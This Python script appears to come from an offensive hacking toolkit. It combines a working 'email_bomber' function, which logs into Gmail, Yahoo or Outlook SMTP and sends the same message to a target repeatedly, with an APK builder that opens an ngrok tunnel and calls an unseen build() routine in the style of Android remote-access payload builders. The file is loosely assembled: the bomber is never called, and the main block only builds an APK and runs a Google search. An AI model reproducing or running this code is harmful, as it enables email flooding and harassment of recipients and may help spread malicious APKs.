import os
import smtplib
from requests import get
from googlesearch import search
from bs4 import BeautifulSoup
import colorama
import socket

try:
    from pyngrok import ngrok, conf
except ImportError:
    ngrok = None
    conf = None
    print("[-] pyngrok not found. Install it with: pip install pyngrok")

try:
    from utils import build
except ImportError:
    print("[-] Could not import 'build' from utils.py. Please check that utils.py exists and contains a build() function.")
    build = None

colorama.init(autoreset=True)

class colors:
    red = colorama.Fore.RED
    blue = colorama.Fore.BLUE
    green = colorama.Fore.GREEN
    magenta = colorama.Fore.MAGENTA
    yellow = colorama.Fore.YELLOW
    reset = colorama.Fore.RESET

def display_kanki():
    kanki = """
             {red}kiya enjil
                                          {blue}
                                                      ████                
                                                    ██▓▓██                
                                                ████▓▓██████              
                                    ██████████████▓▓██░░████              
                          ██████████████████████▓▓██░░░░████              
                  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓██░░░░░░████████          
              ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░██▓▓▓▓▓▓████        
          ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░██▓▓▓▓▓▓▓▓████      
    ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓████    
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██    
██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████  
  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓████
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
        ██████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
            ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██        ██▓▓██  
        ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████▓▓██
    ██▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████████
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████      ██████████
  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████░░██        ██      
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██░░██              
      ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░░░░░██            
            ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓▓▓██░░░░░░░░░░████████      
                  ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░▓▓▓▓▓▓▓▓██░░░░░░░░░░██████████      
                  ██▓▓▓▓▓▓▓▓▓▓██░░░░░░░░▓▓▓▓████████████████              
                ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██████████      ████                  
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██        ██          ██                
              ██████▓▓▓▓▓▓▓▓██░░██  ████    ██          ██                
    ██████        ██▓▓▓▓██▓▓░░░░██████████  ██          ██                
    ██▒▒▒▒██████████    ████░░░░██░░░░████  ██          ██                
    ██▒▒▒▒▒▒▒▒██          ██░░░░░░░░░░████  ██          ██                
  ██    ▒▒▒▒▒▒██          ██████░░░░░░████  ██        ██                   
  ██    ▒▒▒▒▒▒██          ██▓▓▓▓████████    ██        ██                   
  ██          ██          ██▓▓▓▓████      ██        ████                   
██▒▒▒▒      ░░████      ██▓▓▓▓▓▓▓▓██  ████          ██                     
██▒▒▒▒▒▒    ██    ████████████████████  ████████████                       
██▒▒▒▒▒▒▒▒▒▒██          ██              ██                                
  ██▒▒▒▒▒▒██          ██                ██                                
  ██▒▒▒▒██            ██              ██                                  
    ████                ██              ██                                  
                      ██                ██                                
                      ████████████████████                                
                      ██▒▒▒▒▒▒▒▒▒▒        ████                            
                      ██▒▒▒▒▒▒▒▒          ▒▒▒▒██                          
                      ██▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒██                        
                      ██▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒▒▒██                        
                      ████████████████████████████
    """.format(red=colors.red, blue=colors.blue)

    print(kanki)

def stdOutput(type):
    output_colors = {
        "info": colors.green,
        "error": colors.red,
        "warning": colors.yellow,
        "fail": colors.magenta,
    }
    return output_colors.get(type, colors.reset)

def clearDirec():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def email_bomber(server_choice, user, pwd, to, subject, body, count):
    message = f'From: {user}\nSubject: {subject}\n\n{body}'
    sent = 0
    server = None

    try:
        if server_choice.lower() == 'gmail':
            server = smtplib.SMTP("smtp.gmail.com", 587)
        elif server_choice.lower() == 'yahoo':
            server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
        elif server_choice.lower() == 'outlook':
            server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        else:
            print(stdOutput("error") + "Invalid server type.")
            return

        server.starttls()
        server.login(user, pwd)

        while sent < count:
            try:
                server.sendmail(user, to, message)
                print(stdOutput("info") + f"[+] Sent {sent + 1} email(s)")
                sent += 1
            except KeyboardInterrupt:
                print(stdOutput("fail") + "Cancelled by user.")
                break
            except Exception as e:
                print(stdOutput("error") + f"Error sending email: {str(e)}")
                break

        server.quit()
    except Exception as e:
        print(stdOutput("error") + f"Failed to connect to the server: {str(e)}")

def search_results(query):
    try:
        print(stdOutput("info") + "Searching Google for: " + query)
        results = search(query, num_results=5)
        return results
    except Exception as e:
        print(stdOutput("error") + f"Error while searching: {str(e)}")
        return []

def fetch_page_data(url):
    try:
        response = get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup
    except Exception as e:
        print(stdOutput("error") + f"Error while fetching page: {str(e)}")
        return None

def apk_file_builder(file_name, use_ngrok=False):
    if use_ngrok and ngrok:
        public_url = ngrok.connect(80)
        print(stdOutput("info") + f"Ngrok tunnel available at: {public_url}")
    try:
        build(file_name)
        print(stdOutput("info") + f"APK file {file_name} has been built successfully.")
    except Exception as e:
        print(stdOutput("error") + f"Failed to build APK: {str(e)}")

if __name__ == "__main__":
    clearDirec()
    display_kanki()
    apk_file_builder("myApp.apk", use_ngrok=True)
    results = search_results("openai")
    if results:
        print(stdOutput("info") + "Google Search Results: ")
        for result in results:
            print(result)

